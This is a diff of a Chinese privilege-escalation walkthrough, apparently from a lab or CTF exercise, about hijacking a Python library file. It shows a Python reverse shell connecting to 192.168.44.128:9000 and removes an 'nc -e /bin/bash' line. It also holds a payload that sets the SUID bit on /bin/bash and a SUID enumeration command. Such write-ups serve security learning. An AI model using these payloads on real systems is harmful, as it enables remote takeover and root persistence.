@@ -85,9 +85,8 @@ jaba@jabita:/home/jack$ ls -all /usr/lib/python3.10/wild.py
 ```c
 import os
 def first():
-	os.system("python3 -c \"import       os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.1.158',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\"")
+	os.system("python3 -c \"import       os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.44.128',9000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\"")
 
-os.system("nc -e /bin/bash 192.168.44.128 9000")
 ```
 
 实战中，如果机器不出网，我们可以修改该脚本的内容，让它可以使用 SUID 执行 bash。或者直接创建一个root权限的账号。
@@ -96,4 +95,8 @@ os.system("nc -e /bin/bash 192.168.44.128 9000")
 import os
 def first():	
 	os.system("chmod u+s /bin/bash")
+```
+
+```c
+find / -perm -u=s -type f 2>/dev/null
 ```
